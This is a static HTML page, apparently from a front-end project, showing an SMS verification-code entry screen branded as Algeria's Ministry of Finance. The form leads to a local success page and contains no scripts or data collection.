<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>verification code</title>
    <link rel="stylesheet" href="../ar_css/check.css" />
    <link rel="icon" href="../imgs/algerie.png" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
    />
    <style>
      * {
        direction: ltr;
      }
      input::placeholder {
        padding-left: 1em;
      }
      section p {
        font-size: 1.1em;
      }
      .confirm {
        padding-left: 0.5em;
      }
    </style>
  </head>
  <body>
    <header>
      <div class="logo">
        <img src="../imgs/algerie.png" alt="algerian flag" />
      </div>

      <div class="gov">
        <p>People's Democratic Republic of Algeria</p>
        <p>Ministry of Finance</p>
      </div>

      <div class="lang"></div>
    </header>
    <section>
      <div class="check">
        <p>
          Verification code has been sent to this number :
          <span>0778******</span> Enter it for verification
        </p>
        <form action="../en_html/ensuccess.html">
          <input
            type="number"
            class="confirm"
            placeholder="Enter verification code"
            required
            min="100000"
            max="999999"
            autofocus
          />
          <button type="submit" value=" continue" class="pay">Continue</button>
        </form>
      </div>
    </section>
  </body>
</html>
